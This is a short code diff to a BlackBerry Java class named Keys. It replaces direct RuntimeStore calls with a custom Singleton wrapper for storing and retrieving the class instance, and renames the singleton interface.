@@ -9,20 +9,20 @@
 package blackberry.config;
 
 import net.rim.device.api.crypto.MD5Digest;
-import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.util.Arrays;
 import blackberry.Device;
+import blackberry.Singleton;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.interfaces.Singleton;
+import blackberry.interfaces.iSingleton;
 import fake.InstanceKeysFake;
 
 /**
  * The Class Keys.
  */
-public final class Keys implements Singleton {
+public final class Keys implements iSingleton {
 
     //#ifdef DEBUG
     static Debug debug = new Debug("Keys", DebugLevel.VERBOSE);
@@ -67,7 +67,7 @@ public final class Keys implements Singleton {
         //#endif
 
         if (!isInstanced() || instance.getLogKey() == null) {
-            instance = (Keys) RuntimeStore.getRuntimeStore().get(GUID);
+            instance = (Keys) Singleton.self().get(GUID);
             if (instance == null) {
                 instance = new Keys();
 
@@ -82,7 +82,7 @@ public final class Keys implements Singleton {
                     instance.setKeys(instanceKeyEmbedded);
                 }
 
-                RuntimeStore.getRuntimeStore().put(GUID, instance);
+                Singleton.self().put(GUID, instance);
             }
         }
 
